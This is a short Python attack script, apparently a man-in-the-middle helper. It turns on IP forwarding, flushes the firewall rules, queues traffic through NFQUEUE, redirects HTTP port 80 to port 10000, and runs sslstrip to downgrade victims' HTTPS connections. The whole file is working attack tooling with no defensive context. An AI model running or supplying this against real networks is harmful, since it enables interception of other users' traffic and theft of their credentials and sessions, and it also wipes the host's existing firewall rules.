
import os
import sys
import subprocess
from colorama import init
from termcolor import colored


os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print(colored("[+] Forwarding request...", "yellow"))
os.system("iptables --flush")
os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
print(colored("[+] Queue processing......", "green"))
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
print(colored("[+] Redirecting ports...", "cyan"))
print(colored("[+] Using SSLstripe", "white"))
subprocess.call(["sslstrip"])